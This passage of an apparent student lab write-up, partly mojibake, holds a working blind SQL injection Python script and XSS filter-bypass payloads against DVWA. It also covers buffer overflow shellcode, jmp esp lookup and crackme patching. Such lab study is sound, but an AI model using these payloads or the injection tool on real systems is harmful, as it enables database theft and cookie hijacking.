                html = self.s.post(self.url,data=data,headers=self.headers).text
                if self.check(html):
                    name += chr(j)
                    break
            if len(name) != i:
                name += '|'
        self.word_name.append(name)
        print('\n==>',self.word_name[word_num])
```

### high

```python
import requests
import string

class Injection:
    def __init__(self,url):
        self.url = url
        self.s = requests.session()
        self.zifuji = [44,48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 95, 45, 64, 33, 38, 36]
    def get_headers(self,payload):
        headers = {
            'Cookie': "id={0}; security=high; PHPSESSID=ms11imgpftrmfcp27rmk9s006c".format(payload)
        }
        return headers
    def process(self,yourstr,num1,num2):
        print("[+] Please wait ... {0} [{1}]/[{2}]".format(yourstr,str(num1),str(num2)),end='\r')
    def check(self,text):
        if "User ID exists in the database." in text:
            return True
        elif "User ID is MISSING from the database." in text:
            return False
    def run(self):
        self.get_itsnum()
        self.get_database_length()
        self.get_database()
        self.get_table_num()
        self.table_length = []
        self.table_name = []
        self.get_table_length()
        self.get_table_name()
        table_name = input('[-] table_name: ')
        self.get_column_num(table_name)
        self.column_length = []
        self.column_name = []
        self.get_column_length(table_name)
        self.get_column_name(table_name)
        column_names = input('[-] column_name: ').split(',')
        self.word_num = 0
        self.get_word_num(table_name,column_names[0])
        self.word_name = []
        self.word_length = []
        for i in range(len(column_names)):
            print(column_names[i])
            self.get_word_length(table_name,column_names[i])
            self.get_word_name(table_name,column_names[i],i)
        
    def get_itsnum(self):
        self.itsnum = 0
        for i in range(1,50):
            self.process('get_itsnum',i,50)
            payload = "1' order by {0}#".format(str(i))
            html = self.s.get(self.url,headers=self.get_headers(payload)).text
            if not self.check(html):
                self.itsnum = i - 1
                break
        if self.itsnum > 0:
            print('\n==>',self.itsnum)
        else:
            print("\ncan not get the itsnum")
    def get_database_length(self):
        self.database_length = 0
        for i in range(1,30):
            self.process('get_database_length',i,30)
            payload = "1' and length(database())={0}#".format(str(i))
            html = self.s.get(self.url,headers=self.get_headers(payload)).text
            if self.check(html):
                self.database_length = i
                break
        if self.database_length > 0:
            print('\n==>',self.database_length)
        else:
            print("\ncan not get the database_length")
    def get_database(self):
        self.database = ''
        for i in range(1,self.database_length+1):
            for j in self.zifuji:
                self.process(str(i) + ' get_database',j,self.database_length+1)
                payload = "1' and ascii(substring(database(),{0},1))={1}#".format(str(i),str(j))
                html = self.s.get(self.url,headers=self.get_headers(payload)).text
                if self.check(html):
                    self.database += chr(j)
                    break
            if len(self.database) != i:
                self.database += '666'
        if len(self.database) > 0:
            print('\n==>',self.database)
        else:
            print("\n can not get the database")
    def get_table_num(self):
        self.table_num = 0
        for i in range(1,30):
            self.process('get_table_num',i,30)
            payload = "1' and (select count(table_name)a from information_schema.tables where table_schema=database() having a={0})#".format(str(i))
            html = self.s.get(self.url,headers=self.get_headers(payload)).text
            if self.check(html):
                self.table_num = i
                break
        if self.table_num > 0:
            print('\n==>',self.table_num)
        else:
            print("\ncan not get the table_num")           
    def get_table_length(self):
        for i in range(1,50):
            self.process('get_table_length',i,50)
            payload = "1' and (select length(group_concat(table_name)) as a from information_schema.tables where table_schema=database() having a={0})#".format(str(i))
            html = self.s.get(self.url,headers=self.get_headers(payload)).text
            if self.check(html):
                self.table_length.append(i)
                break
        if self.table_length[0] > 0:
            print('\n==>',self.table_length)
        else:
            print('\ncan not get the table_length')
    def get_table_name(self):
        name = ''
        for i in range(1,self.table_length[0]+1):
            for j in self.zifuji:
                self.process('{0} get_table_name'.format(i),j,50)
                payload = "1' and (select ascii(substring(group_concat(table_name),{0},1)) as a from information_schema.tables where table_schema=database() having a={1})#".format(str(i),str(j))
                html = self.s.get(self.url,headers=self.get_headers(payload)).text
                if self.check(html):
                    name += chr(j)
                    break
            if len(name) != i:
                name += '|'
        if len(name) > 0:
            print('\n==>',name)
            self.table_name.append(name)
        else:
            print('\ncan not get the table_name')
    def get_column_num(self,table_name):
        self.column_num = 0
        for i in range(1,30):
            self.process('get_column_num',i,30)
            payload = "1' and (select count(column_name) as a from information_schema.columns where table_schema=database() and table_name='{0}' having a={1})#".format(table_name,str(i))
            html = self.s.get(self.url,headers=self.get_headers(payload)).text
            if self.check(html):
                self.column_num = i
                break
        if self.column_num > 0:
            print('\n==>',self.column_num)
    def get_column_length(self,table_name):
        for i in range(1,100):
            self.process('get_column_length',i,100)
            payload = "1' and (select length(group_concat(column_name)) as a from information_schema.columns where table_schema=database() and table_name='{0}' having a={1})#".format(table_name,str(i))
            html = self.s.get(self.url,headers=self.get_headers(payload)).text
            if self.check(html):
                self.column_length.append(i)
                break
        if len(self.column_length) >= 1:
            print('\n==>',self.column_length)
        else:
            print('\ncan not get the column_length')
    def get_column_name(self,table_name):
        name = ''
        for i in range(1,self.column_length[0]+1):
            for j in self.zifuji:
                self.process('{0} get_column_name'.format(str(i)),j,100)
                payload = "1' and (select ascii(substring(group_concat(column_name),{0},1)) as a from information_schema.columns where table_schema=database() and table_name='{1}' having a={2})#".format(str(i),table_name,str(j))
                html = self.s.get(self.url,headers=self.get_headers(payload)).text
                if self.check(html):
                    name += chr(j)
                    break
            if len(name) != i:
                name += '|'
        if len(name) == self.column_length[0]:
            self.column_name.append(name)
            print('\n==>',self.column_name[0])
        else:
            print('\ncan not get the column_name')
    def get_word_num(self,table_name,column_name):
        for i in range(1,100):
            self.process('get_word_num',i,30)
            payload = "1' and (select count({0}) as a from {1} having a={2})#".format(column_name,table_name,str(i))
            html = self.s.get(self.url,headers=self.get_headers(payload)).text
            if self.check(html):
                self.word_num = i
                break
        if self.word_num > 0:
            print('\n==>',self.word_num)
        else:
            print('\ncan not get the word_num')
    def get_word_length(self,table_name,column_name):
        for i in range(1,200):
            self.process('get_{0}_length'.format(column_name),i,200)
            payload = "1' and (select length(group_concat({0})) as a from {1} having a={2})#".format(column_name,table_name,str(i))
            html = self.s.get(self.url,headers=self.get_headers(payload)).text
            if self.check(html):
                self.word_length.append(i)
                break
        if len(self.word_length) >= 1:
            print('\n==>',self.word_length)
        else:
            print('\ncan not get the word length') 
    def get_word_name(self,table_name,column_name,word_num):
        name = ''
        for i in range(1,self.word_length[word_num]+1):
            for j in self.zifuji:
                self.process('get_{0}_name'.format(str(i)),j,100)
                payload = "1' and (select ascii(substring(group_concat({0}),{1},1)) as a from {2} having a={3})#".format(column_name,str(i),table_name,str(j))
                html = self.s.get(self.url,headers=self.get_headers(payload)).text
                if self.check(html):
                    name += chr(j)
                    break
            if len(name) != i:
                name += '|'
        self.word_name.append(name)
        print('\n==>',self.word_name[word_num])
```

# DVWAâ€”â€”Reflected XSS

## çº§åˆ«ï¼šlow

### Reflected XSS Source

```php
<?php

header ("X-XSS-Protection: 0");

// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Feedback for end user
    echo '<pre>Hello ' . $_GET[ 'name' ] . '</pre>';
}

?>
```

### åˆ†æ

 å¯ä»¥çœ‹åˆ°ï¼Œä»£ç ç›´æ¥å¼•ç”¨äº†nameå‚æ•°ï¼Œå¹¶æ²¡æœ‰ä»»ä½•çš„è¿‡æ»¤ä¸æ£€æŸ¥ï¼Œå­˜åœ¨æ˜æ˜¾çš„XSSæ¼æ´ ã€‚

 è¾“å…¥

```
<script>alert('xss')</script>
```

![MNT1gJ.png](https://s2.ax1x.com/2019/11/14/MNT1gJ.png)

æŸ¥çœ‹æºç å¯ä»¥å‘ç°ä»£ç è¢«è§£é‡Šæ‰§è¡Œäº†

![MNTa4O.png](https://s2.ax1x.com/2019/11/14/MNTa4O.png)

### è·å–cookie

è¾“å…¥

```
<script>alert(document.cookie)</script>
```

![MNTxxJ.png](https://s2.ax1x.com/2019/11/14/MNTxxJ.png)

## çº§åˆ«ï¼šmedium

### Reflected XSS Source

```php
<?php

header ("X-XSS-Protection: 0");

// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Get input
    $name = str_replace( '<script>', '', $_GET[ 'name' ] );

    // Feedback for end user
    echo "<pre>Hello ${name}</pre>";
}

?>
```

### åˆ†æ

 Mediumçº§åˆ«çš„ä»£ç ç›¸å¯¹äºLowçº§åˆ«çš„ä»£ç ä½¿ç”¨`str_replace`å‡½æ•°å°†è¾“å…¥ä¸­çš„`<script>`åˆ é™¤ 

### æ–¹æ³•

1.  ä½¿ç”¨åŒå†™ç»•è¿‡ï¼Œè¾“å…¥ `<scr<script>ipt>alert(document.cookie)</script>` 
2.  ä½¿ç”¨å¤§å°å†™ç»•è¿‡ï¼Œè¾“å…¥ ` <sCript>alert(document.cookie)</script> `
3.  è¾“å…¥å…¶ä»–æ ‡ç­¾ï¼Œå¦‚`  <IMG src=1 onerror=alert(document.cookie)> `

ç»“æœï¼š

![MNH1mR.png](https://s2.ax1x.com/2019/11/14/MNH1mR.png)

## çº§åˆ«ï¼šhigh

### Reflected XSS Source

```php
<?php

header ("X-XSS-Protection: 0");

// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Get input
    $name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] );

    // Feedback for end user
    echo "<pre>Hello ${name}</pre>";
}

?>
```

### åˆ†æ

 å¯ä»¥çœ‹åˆ°Highçº§åˆ«çš„ä»£ç ä½¿ç”¨äº†  `preg_replace ` å‡½æ•°æ‰§è¡Œä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼çš„æœç´¢å’Œæ›¿æ¢,å…¶ä¸­ ` /<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i ` æ˜¯æ­£åˆ™è¡¨è¾¾å¼ ` (.*) ` è¡¨ç¤ºè´ªå©ªåŒ¹é…ï¼Œ`  /i ` è¡¨ç¤ºä¸åŒºåˆ†å¤§å°å†™æ‰€ä»¥åœ¨Highçº§åˆ«çš„ä»£ç ä¸­ï¼Œæ‰€æœ‰å…³äº  ` <script>  ` æ ‡ç­¾å‡è¢«è¿‡æ»¤åˆ é™¤äº† 

### æ–¹æ³•

`<script>` æ ‡ç­¾ä¸ç®¡ç”¨äº†ï¼Œä½†æ˜¯å¯ä»¥ä½¿ç”¨å…¶ä»–æ ‡ç­¾ç»•è¿‡ 

è¾“å…¥

```
<IMG src=1 onerror=alert(document.cookie)>
```

![MNbeHI.png](https://s2.ax1x.com/2019/11/14/MNbeHI.png)

# DVWAâ€”â€”Stored XSS

## çº§åˆ«ï¼šlow

### Stored XSS Source

```php
<?php

if( isset( $_POST[ 'btnSign' ] ) ) {
    // Get input
    $message = trim( $_POST[ 'mtxMessage' ] );
    $name    = trim( $_POST[ 'txtName' ] );

    // Sanitize message input
    $message = stripslashes( $message );
    $message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

    // Sanitize name input
    $name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

    // Update database
    $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    //mysql_close();
}

?>
```

### åˆ†æ

 `isset() ` å‡½æ•°åœ¨phpä¸­ç”¨æ¥æ£€æµ‹å˜é‡æ˜¯å¦è®¾ç½®ï¼Œè¯¥å‡½æ•°è¿”å›çš„æ˜¯å¸ƒå°”ç±»å‹çš„å€¼ï¼Œå³true/false 

 `trim() ` å‡½æ•°ä½œç”¨ä¸ºç§»é™¤å­—ç¬¦ä¸²ä¸¤ä¾§ç©ºç™½å­—ç¬¦æˆ–å…¶ä»–é¢„å®šä¹‰å­—ç¬¦ 

 `stripslashes() ` å‡½æ•°ç”¨äºåˆ é™¤å­—ç¬¦ä¸²ä¸­çš„åæ–œæ  

 `mysqli_real_escape_string() ` å‡½æ•°ä¼šå¯¹å­—ç¬¦ä¸²ä¸­çš„ç‰¹æ®Šå·`(\x00ï¼Œ\nï¼Œ\rï¼Œ\ï¼Œ'ï¼Œ"ï¼Œ\x1a) ` è¿›è¡Œè½¬ä¹‰ 

 åœ¨ä»£ç ä¸­å¯¹messageï¼Œnameè¾“å…¥æ¡†å†…å®¹  æ²¡æœ‰è¿›è¡ŒXSSæ–¹é¢çš„è¿‡æ»¤å’Œæ£€æŸ¥ 

 ä¸”é€šè¿‡  `query ` è¯­å¥æ’å…¥åˆ°æ•°æ®åº“ä¸­ã€‚æ‰€ä»¥å­˜åœ¨å­˜å‚¨å‹XSSæ¼æ´ 

### æ–¹æ³•

ç”±äºnameå’Œmessageè¾“å…¥æ¡†å‡å­˜åœ¨xssã€‚ä½†nameè¾“å…¥æ¡†æœ‰å­—ç¬¦é™åˆ¶ï¼Œè¿™é‡Œå¯ä»¥ä½¿ç”¨burpsuiteæŠ“åŒ…ä¿®æ”¹nameè¾“å…¥æ¡†å†…å®¹ï¼š 

```
<script>alert(document.cookie)</script>
```

![MUAK3Q.png](https://s2.ax1x.com/2019/11/14/MUAK3Q.png)

![MUAQjs.png](https://s2.ax1x.com/2019/11/14/MUAQjs.png)

![MUA1un.png](https://s2.ax1x.com/2019/11/14/MUA1un.png)

**ç”±äºæäº¤çš„ç»“æœå­˜å‚¨åœ¨æ•°æ®åº“ä¸­ï¼Œæ‰€ä»¥æ¯æ¬¡åˆ·æ–°é¡µé¢ï¼Œè¾“å…¥çš„æ¶æ„ä»£ç å°±ä¼šè¢«æ‰§è¡Œä¸€æ¬¡ **

## çº§åˆ«ï¼šmedium

### Stored XSS Source

```php
<?php

if( isset( $_POST[ 'btnSign' ] ) ) {
    // Get input
    $message = trim( $_POST[ 'mtxMessage' ] );
    $name    = trim( $_POST[ 'txtName' ] );

    // Sanitize message input
    $message = strip_tags( addslashes( $message ) );
    $message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    $message = htmlspecialchars( $message );

    // Sanitize name input
    $name = str_replace( '<script>', '', $name );
    $name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

    // Update database
    $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    //mysql_close();
}

?>
```

### åˆ†æ

 `strip_tags() ` å‡½æ•°å‰¥å»å­—ç¬¦ä¸²ä¸­çš„ HTMLã€XML ä»¥åŠ PHP çš„æ ‡ç­¾ï¼Œä½†å…è®¸ä½¿ç”¨ `<b>` æ ‡ç­¾ã€‚ 

 `addslashes() ` å‡½æ•°è¿”å›åœ¨é¢„å®šä¹‰å­—ç¬¦ï¼ˆå•å¼•å·ã€åŒå¼•å·ã€åæ–œæ ã€NULLï¼‰ä¹‹å‰æ·»åŠ åæ–œæ çš„å­—ç¬¦ä¸²ã€‚ 

 `htmlspecialchars() ` å‡½æ•°æŠŠé¢„å®šä¹‰çš„å­—ç¬¦&ã€"ã€'ã€<ã€>è½¬æ¢ä¸º HTML å®ä½“ï¼Œé˜²æ­¢æµè§ˆå™¨å°†å…¶ä½œä¸ºHTMLå…ƒç´  

 å¯¹messageè¾“å…¥å†…å®¹è¿›è¡Œæ£€æµ‹è¿‡æ»¤ï¼Œå› æ­¤æ— æ³•å†é€šè¿‡messageå‚æ•°æ³¨å…¥XSSä»£ç 
ä½†æ˜¯å¯¹äºnameå‚æ•°ï¼Œåªæ˜¯ç®€å•è¿‡æ»¤äº†`<script>`å­—ç¬¦ä¸²ï¼Œä»ç„¶å­˜åœ¨å­˜å‚¨å‹çš„XSSã€‚ 

### æ–¹æ³•

 æŠ“åŒ…ä¿®æ”¹nameè¾“å…¥å†…å®¹:

1.  ä½¿ç”¨åŒå†™ç»•è¿‡ï¼Œè¾“å…¥  `<scr<script>ipt>alert(document.cookie)</script> `
2.  ä½¿ç”¨å¤§å°å†™ç»•è¿‡ï¼Œè¾“å…¥`  <sCript>alert(document.cookie)</script> `
3.  è¾“å…¥å…¶ä»–æ ‡ç­¾ï¼Œå¦‚  `<IMG src=1 onerror=alert(document.cookie)> `

![MUmpy4.png](https://s2.ax1x.com/2019/11/14/MUmpy4.png)

**ç”±äºlowçº§åˆ«å·²ç»æ³¨å…¥è¿‡ï¼Œæ‰€ä»¥æ‰“å¼€mediumçº§åˆ«ä¼šç›´æ¥å¼¹å‡ºcookie**

## çº§åˆ«ï¼šhigh

### Stored XSS Source

```php
<?php

if( isset( $_POST[ 'btnSign' ] ) ) {
    // Get input
    $message = trim( $_POST[ 'mtxMessage' ] );
    $name    = trim( $_POST[ 'txtName' ] );

    // Sanitize message input
    $message = strip_tags( addslashes( $message ) );
    $message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    $message = htmlspecialchars( $message );

    // Sanitize name input
    $name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $name );
    $name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

    // Update database
    $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    //mysql_close();
}

?>
```

### åˆ†æ

å’Œä¸Šé¢ä¸¤ä¸ªçº§åˆ«ä¸€æ ·ï¼ŒæŠ“åŒ…ä¿®æ”¹nameå†…å®¹å³å¯ï¼Œä»£ç å¯¹nameè¾“å…¥å†…å®¹åˆ©ç”¨æ­£åˆ™åŒ¹é…åˆ é™¤æ‰€æœ‰å…³äº`<script>`æ ‡ç­¾

### æ–¹æ³•

æŠ“åŒ…ä¿®æ”¹nameå†…å®¹ä¸º

```
<IMG src=1 onerror=alert(document.cookie)>
```

# ä½œä¸šä¸‰

## crackme:

æ‰“å¼€IDAæ‰¾åˆ°åˆ¤æ–­è·³è½¬è¯­å¥ä½ç½®

![MReyX4.png](https://s1.ax1x.com/2019/11/19/MReyX4.png)

ä¿®æ”¹è·³è½¬æŒ‡ä»¤

![MReocD.png](https://s1.ax1x.com/2019/11/19/MReocD.png)

åº”ç”¨åˆ°ç¨‹åº

![MReOAI.png](https://s1.ax1x.com/2019/11/19/MReOAI.png)

è¿è¡Œç»“æœï¼š

æ­£ç¡®å¯†ç æ˜¾ç¤ºé”™è¯¯ï¼Œé”™è¯¯å¯†ç æ˜¾ç¤ºæ­£ç¡®ã€‚

![MRmkEn.png](https://s1.ax1x.com/2019/11/19/MRmkEn.png)

## overflow(1):

é¦–å…ˆè¾“å…¥7ä¸ªqçœ‹ä¸€ä¸‹æ ˆæƒ…å†µ

![Mqgxu8.png](https://s2.ax1x.com/2019/11/23/Mqgxu8.png)

authenticatedçš„å€¼æ˜¯1

è¾“å…¥8ä¸ªq

æ²¡æœ‰æ‰§è¡Œå‰ï¼Œauthenticatedçš„å€¼è¿˜æ˜¯1

![Mq2JKK.png](https://s2.ax1x.com/2019/11/23/Mq2JKK.png)

æ‰§è¡Œä»¥åï¼Œå€¼è¢«è¦†ç›–ä¸º0

![Mq2UVe.png](https://s2.ax1x.com/2019/11/23/Mq2UVe.png)

## overflow(2):

å°†è·³è½¬åœ°å€è¦†ç›–ä¸ºéªŒè¯é€šè¿‡çš„åœ°å€

![Mq2qZF.png](https://s2.ax1x.com/2019/11/23/Mq2qZF.png)

ç”¨ultraeditç¼–è¾‘passwordæ–‡ä»¶ï¼Œä»»æ„å¡«å……8å­—ç¬¦è¦†ç›–passwordï¼Œ4å­—ç¬¦è¦†ç›–authenticatedï¼Œ4å­—ç¬¦è¦†ç›–ä¸Šä¸€æ ˆå¸§çš„ebp,å¡«å…¥4ä¸ªå­—ç¬¦è¿”å›åœ°å€ã€‚

![MqRldg.png](https://s2.ax1x.com/2019/11/23/MqRldg.png)

å†è¿è¡Œç¨‹åº

![MqRweU.png](https://s2.ax1x.com/2019/11/23/MqRweU.png)

## overflow(3):

ç¨‹åºä¸2çš„åŒºåˆ«æ˜¯å¢åŠ äº†å¤´æ–‡ä»¶windows.hï¼Œbuffç”±8å­—èŠ‚å˜æˆ44å­—èŠ‚ï¼Œæœ‰è¶³å¤Ÿç©ºé—´å¡«å…¥ä»£ç ã€‚

æ‰¾åˆ°buffåœ°å€å’Œè¿”å›åœ°å€

![MLYJ5F.png](https://s2.ax1x.com/2019/11/24/MLYJ5F.png)

æ‰¾åˆ°messageboxAå…¥å£åœ°å€

```c++
#include <stdio.h>
#include <windows.h>
 
typedef void (*FuncPointer)(LPTSTR);  // å‡½æ•°æŒ‡é’ˆ  
 
int main()
{   
    HINSTANCE LibHandle;
    FuncPointer GetAddr;
    // åŠ è½½æˆåŠŸåè¿”å›åº“æ¨¡å—çš„å¥æŸ„ 
    LibHandle = LoadLibrary("user32");  
    printf("user32 LibHandle = 0x%X\n", LibHandle);
    // è¿”å›åŠ¨æ€é“¾æ¥åº“(DLL)ä¸­çš„è¾“å‡ºåº“å‡½æ•°åœ°å€
    GetAddr=(FuncPointer)GetProcAddress(LibHandle,"MessageBoxA");   
    printf("MessageBoxA = 0x%X\n", GetAddr);
    return 0;
}
```

![MLt0zj.png](https://s2.ax1x.com/2019/11/24/MLt0zj.png)

æ„é€ password

| æœºå™¨ç      | æ±‡ç¼–æŒ‡ä»¤           | è§£é‡Š                |
| ---------- | ------------------ | ------------------- |
| 33DB       | XOR EBX,EBX        | å°†EBXå¯„å­˜å™¨ç½®ä¸ºNULL |
| 53         | PUSH EBX           |                     |
| 686A6F6B65 | PUSH 656b6f6a      | Thisjoke            |
| 6854686973 | PUSH 73696854      |                     |
| 8BC4       | MOV EAX,ESP        | EAXé‡Œå­˜å…¥å­—ç¬¦ä¸²æŒ‡é’ˆ |
| 53         | PUSH EBX           |                     |
| 50         | PUSH EAX           |                     |
| 50         | PUSH EAX           |                     |
| 53         | PUSH EBX           |                     |
| B8301D3148 | MOV EAX,0x48311D30 | è°ƒç”¨MessageBoxA     |
| FFD0       | CALL EAX           |                     |

![MLLowj.png](https://s2.ax1x.com/2019/11/24/MLLowj.png)

ç”±äºwin10ä¿æŠ¤æœºåˆ¶å¤ªå¼ºï¼Œæ²¡æœ‰åŠæ³•æ˜¾ç¤ºmessagebox

æ¢åˆ°xpç³»ç»Ÿä¸Šå®ç°

å…ˆæ‰¾åˆ°messageboxAçš„å…¥å£åœ°å€

![MLOene.png](https://s2.ax1x.com/2019/11/24/MLOene.png)

å†æ‰¾åˆ°buffèµ·å§‹åœ°å€

![MLO8c8.png](https://s2.ax1x.com/2019/11/24/MLO8c8.png)

![MLON7j.png](https://s2.ax1x.com/2019/11/24/MLON7j.png)

![MLOsjU.png](https://s2.ax1x.com/2019/11/24/MLOsjU.png)

å®šä½shellcodeï¼Œæ‰¾jmp espæŒ‡ä»¤

```c++
#include <windows.h>
#include <stdio.h>
#define DLL_NAME "user32.dll"
main()
{
    BYTE* ptr;
    int position,address;
    HINSTANCE handle;
    BOOL done_flag = FALSE;
    handle=LoadLibrary(DLL_NAME);
    if(!handle)
    {
        printf(" load dll erro !");
        exit(0);
    }

    ptr = (BYTE*)handle;

    for(position = 0; !done_flag; position++)
    {
        try
        {
            if(ptr[position] == 0xFF && ptr[position+1] == 0xE4)
            {
                //0xFFE4 is the opcode of jmp esp
                int address = (int)ptr + position;
                printf("OPCODE found at 0x%x\n",address);
            }
        }
        catch(...)
        {
            int address = (int)ptr + position;
            printf("END OF 0x%x\n", address);
            done_flag = true;
        }
    }
}
```

![MLzBOf.png](https://s2.ax1x.com/2019/11/24/MLzBOf.png)

å®šä½exitprocesså…¥å£åœ°å€

```c++
#include <stdio.h>
#include <windows.h>
 
typedef void (*FuncPointer)(LPTSTR);  // å‡½æ•°æŒ‡é’ˆ  
 
int main()
{   
    HINSTANCE LibHandle;
    FuncPointer GetAddr;
    // åŠ è½½æˆåŠŸåè¿”å›åº“æ¨¡å—çš„å¥æŸ„ 
    LibHandle = LoadLibrary("kernel32");  
    printf("kernel32 LibHandle = 0x%X\n", LibHandle);
    // è¿”å›åŠ¨æ€é“¾æ¥åº“(DLL)ä¸­çš„è¾“å‡ºåº“å‡½æ•°åœ°å€
    GetAddr=(FuncPointer)GetProcAddress(LibHandle,"ExitProcess");   
    printf("ExitProcess = 0x%X\n", GetAddr);
    return 0;
}
```

![MLzqh9.png](https://s2.ax1x.com/2019/11/24/MLzqh9.png)

ä¿®æ”¹passwordæ–‡ä»¶

| æœºå™¨ç      | æ±‡ç¼–æŒ‡ä»¤           | è§£é‡Š                |
| ---------- | ------------------ | ------------------- |
| 33DB       | XOR EBX,EBX        | å°†EBXå¯„å­˜å™¨ç½®ä¸ºNULL |
| 53         | PUSH EBX           |                     |
| 686A6F6B65 | PUSH 656b6f6a      | Thisjoke            |
| 6854686973 | PUSH 73696854      |                     |
| 8BC4       | MOV EAX,ESP        | EAXé‡Œå­˜å…¥å­—ç¬¦ä¸²æŒ‡é’ˆ |
| 53         | PUSH EBX           |                     |
| 50         | PUSH EAX           |                     |
| 50         | PUSH EAX           |                     |
| 53         | PUSH EBX           |                     |
| B8EA07D577 | MOV EAX,0x77D507EA | è°ƒç”¨MessageBoxA     |
| FFD0       | CALL EAX           |                     |
| 53         | PUSH EBX           |                     |
| B8A2BF817C | MOV EAX,0x7C81BFA2 | è°ƒç”¨exitï¼ˆ0ï¼‰       |
| FFD0       | CALL EAX           |                     |

![MOC6uq.png](https://s2.ax1x.com/2019/11/24/MOC6uq.png)

ç°åœ¨ç¨‹åºå°±å¯ä»¥æ­£å¸¸é€€å‡º

![MOC58J.png](https://s2.ax1x.com/2019/11/24/MOC58J.png)

## é€‰åšé¢˜ï¼š

### hello world

åˆ¤æ–­v12æ˜¯å¦æ˜¯314159265ï¼Œæ˜¯çš„è¯ç›´æ¥æ‰“å°flag

![QMp4Qf.png](https://s2.ax1x.com/2019/12/03/QMp4Qf.png)

![QMp7wQ.png](https://s2.ax1x.com/2019/12/03/QMp7wQ.png)

### Simple

![QM9kf1.png](https://s2.ax1x.com/2019/12/03/QM9kf1.png)

å°†ç»™çš„å­—ç¬¦ä¸²ord-1å°±å‡ºflag

![QM9eOO.png](https://s2.ax1x.com/2019/12/03/QM9eOO.png)

### Passthis

è¿™é‡Œæ˜¯ä»–çš„å…³é”®é€»è¾‘ï¼Œv6æ˜¯æˆ‘ä»¬è¾“å…¥çš„å€¼ï¼Œåœ¨å¾ªç¯é‡Œé¢ï¼Œä¸ç»™çš„é‡è¿›è¡Œäº†ï¼Œå¼‚æˆ–ï¼Œç„¶åå¾—å‡ºflag

![QM91fI.png](https://s2.ax1x.com/2019/12/03/QM91fI.png)

0xC1,0x0CB,0x0C6,0x0C0,0x0FC,0x0C9,0x0E8,0x0AB,0x0A7,0x0DE,0x0E8,0x0F2,0x0A7,0x0F4,0x0EF,0x0E8,0x0F2,0x0EB,0x0E3,0x0A7,0x0E9,0x0E8,0x0F3,0x0A7,0x0F7,0x0E6,0x0F4,0x0F4,0x0A7,0x0F3,0x0EF,0x0E2,0x0A7,0x0E1,0x0EB,0x0E6,0x0E0,0x0FA

![QM9J6f.png](https://s2.ax1x.com/2019/12/03/QM9J6f.png)